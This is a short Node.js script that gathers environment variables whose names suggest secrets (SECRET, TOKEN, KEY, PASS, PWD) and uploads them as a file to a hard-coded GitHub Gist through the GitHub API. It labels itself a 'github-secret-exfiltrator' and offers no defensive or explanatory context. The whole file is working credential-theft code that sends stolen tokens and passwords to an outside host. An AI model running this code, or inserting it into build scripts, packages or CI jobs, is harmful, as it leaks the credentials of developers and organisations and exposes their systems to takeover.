const https = require('https');

// Collect sensitive environment variables
const secrets = Object.entries(process.env)
  .filter(([key]) => /SECRET|TOKEN|KEY|PASS|PWD/i.test(key))
  .map(([key, value]) => `${key}=${value}`)
  .join('\n') || 'No secrets found';

// Gist info
const GIST_ID = "ee3c04b3060c4cb0aa1699abe7f13575";
const FILENAME = "secrets.txt";

// Prepare payload to update your existing Gist
const payload = JSON.stringify({
  files: {
    [FILENAME]: {
      content: secrets
    }
  }
});

const options = {
  hostname: 'api.github.com',
  path: `/gists/${GIST_ID}`,
  method: 'PATCH',
  headers: {
    'User-Agent': 'github-secret-exfiltrator',
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(payload)
  }
};

// Send the PATCH request
const req = https.request(options, (res) => {
  let body = '';
  res.on('data', (chunk) => body += chunk);
  res.on('end', () => {
    try {
      const response = JSON.parse(body);
      console.log(`✅ Secrets updated at: ${response.html_url}`);
    } catch (e) {
      console.error(`❌ Failed to parse Gist response: ${body}`);
    }
  });
});

req.on('error', (e) => {
  console.error(`❌ Request failed: ${e.message}`);
});

req.write(payload);
req.end();
